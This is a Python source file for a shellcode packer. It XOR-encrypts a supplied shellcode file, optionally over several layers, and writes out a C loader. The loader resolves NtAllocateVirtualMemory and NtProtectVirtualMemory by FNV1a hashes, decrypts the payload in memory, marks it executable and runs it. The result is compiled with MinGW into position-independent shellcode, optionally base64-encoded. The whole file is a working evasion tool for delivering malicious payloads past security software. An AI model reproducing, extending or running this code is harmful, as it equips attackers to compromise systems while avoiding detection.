import os
import sys
import subprocess
import random
import base64

# ---------------- FNV1a ----------------
FNV_PRIME = 0x01000193
FNV_OFFSET = 0x811c9dc5

def hash_string(name: str) -> int:
    h = FNV_OFFSET
    for b in name.encode():
        h ^= b
        h = (h * FNV_PRIME) & 0xffffffff
    return h

# ---------------- tool discovery ----------------
gcc_names = {"x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc.exe"}
objcopy_names = {"objcopy", "objcopy.exe"}

paths = os.environ.get("PATH", "").split(os.pathsep)

gcc_found = None
objcopy_found = None

for p in paths:
    for name in gcc_names | objcopy_names:
        full = os.path.join(p, name)
        if os.path.isfile(full) and os.access(full, os.X_OK):
            if name in gcc_names and not gcc_found:
                gcc_found = full
            elif name in objcopy_names and not objcopy_found:
                objcopy_found = full
    if gcc_found and objcopy_found:
        break

if not gcc_found:
    print("[!] MinGW-w64 GCC not found")
    sys.exit(1)

if not objcopy_found:
    print("[!] objcopy not found")
    sys.exit(1)

# ---------------- args ----------------
if len(sys.argv) < 3 or sys.argv[1][0] == "-" or sys.argv[2][0] == "-":
    script_name = os.path.basename(sys.argv[0])
    print(f"Usage: {script_name} <shellcode.bin> <output.bin> [-i <iterations>] [-l <key_length>] [-k <key>] [-base64]")
    sys.exit(1)

bin_file = sys.argv[1]
output_bin = sys.argv[2]

args = [arg.lower() for arg in sys.argv]

key_length = 1
iterations = 1
use_base64 = "-base64" in args or "-b64" in args

# ---------------- XOR key ----------------
if "-l" in sys.argv:
    l_index = sys.argv.index("-l")
    key_length = int(sys.argv[l_index + 1])

if "-i" in sys.argv:
    i_index = sys.argv.index("-i")
    iterations = int(sys.argv[i_index + 1])
    if iterations < 1:
        print("[-] Error: iterations must be >= 1")
        sys.exit(1)

if "-k" in sys.argv:
    k_value = sys.argv[sys.argv.index("-k") + 1]

    if "," in k_value:
        fixed_key = [int(b, 0) for b in k_value.split(",")]
    elif k_value.startswith("0x") and len(k_value) > 2:
        hex_str = k_value[2:]
        if len(hex_str) % 2 != 0:
            hex_str = "0" + hex_str
        fixed_key = [int(hex_str[i:i+2], 16) for i in range(0, len(hex_str), 2)]
    else:
        fixed_key = [int(k_value, 0)]

    key_length = len(fixed_key)
else:
    fixed_key = None

# ---------------- read shellcode ----------------
try:
    with open(bin_file, "rb") as f:
        current_shellcode = f.read()
except FileNotFoundError:
    print(f"[-] File not found: {bin_file}")
    sys.exit(1)

# ---------------- helpers ----------------
def xor_bytes(data: bytes, key: list[int]) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def bytes_to_c_array(b: bytes) -> str:
    return ",".join(f"0x{byte:02x}" for byte in b)

# ---------------- hashes ----------------
hash_ntdll = hash_string("ntdll.dll")
hash_ntalloc = hash_string("NtAllocateVirtualMemory")
hash_ntprotect = hash_string("NtProtectVirtualMemory")

# ---------------- C code ----------------
for i in range(iterations):

    key = fixed_key if fixed_key else [random.randint(1, 255) for _ in range(key_length)]

    xor_shellcode = xor_bytes(current_shellcode, key)

    shellcode_array = bytes_to_c_array(xor_shellcode)
    key_array = bytes_to_c_array(key)

    c_code = f'''#include "winapi_loader.h"

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

__attribute__((section(".text"), aligned(1))) unsigned char shellcode[] = {{ {shellcode_array} }};
__attribute__((section(".text"), aligned(1))) unsigned char key[] = {{ {key_array} }};

#define HASH_NTDLL 0x{hash_ntdll:08x}
#define HASH_NtAllocateVirtualMemory 0x{hash_ntalloc:08x}
#define HASH_NtProtectVirtualMemory 0x{hash_ntprotect:08x}

__attribute__((section(".text.start")))
void _start() {{

    HMODULE hNtdll = myGetModuleHandleH(HASH_NTDLL);

    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
        (NtAllocateVirtualMemory_t)myGetProcAddressH(hNtdll, HASH_NtAllocateVirtualMemory);

    NtProtectVirtualMemory_t pNtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)myGetProcAddressH(hNtdll, HASH_NtProtectVirtualMemory);

    SIZE_T size = sizeof(shellcode);
    LPVOID execMemory = NULL;
    SIZE_T regionSize = size;

    pNtAllocateVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    for (SIZE_T i = 0; i < size; i++)
    ((unsigned char*)execMemory)[i] = shellcode[i] ^ key[i % sizeof(key)];

    ULONG oldProtect;

    pNtProtectVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    ((void(*)())execMemory)();
}}
'''

    temp_exe = "temp_loader.exe"

    compile_cmd = [
        "x86_64-w64-mingw32-gcc",
        "-nostdlib", "-nostartfiles",
        "-e", "_start",
        "-Wl,--exclude-all-symbols",
        "-Os", "-s", "-fno-ident", "-flto",
        "-fno-asynchronous-unwind-tables",
        "-T", "linker.ld",
        "-x", "c", "-", "-o", temp_exe
    ]

    proc = subprocess.run(
        compile_cmd,
        input=c_code.encode(),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    if proc.returncode != 0:
        print(proc.stderr.decode())
        sys.exit(1)

    objcopy_cmd = [
        "objcopy",
        "-O", "binary",
        "--only-section=.text",
        temp_exe,
        output_bin
    ]

    proc = subprocess.run(objcopy_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    os.remove(temp_exe)

    if proc.returncode != 0:
        print(proc.stderr.decode())
        sys.exit(1)

    if iterations == 1:
        print(f"[+] Shellcode generated: {output_bin} (XOR key: {key_array})")
    else:
        print(f"[*] Iteration {i+1}/{iterations} - XOR key: {key_array}")

    with open(output_bin, "rb") as f:
        current_shellcode = f.read()

# ---------------- base64 option ----------------
if use_base64:
    with open(output_bin, "rb") as f:
        final_b64 = base64.b64encode(f.read())
    with open(output_bin, "wb") as f:
        f.write(final_b64)

if use_base64 and iterations > 1:
    print(f"[+] Base64 shellcode generated: {output_bin}")
elif iterations > 1:
    print(f"[+] Shellcode generated: {output_bin}")
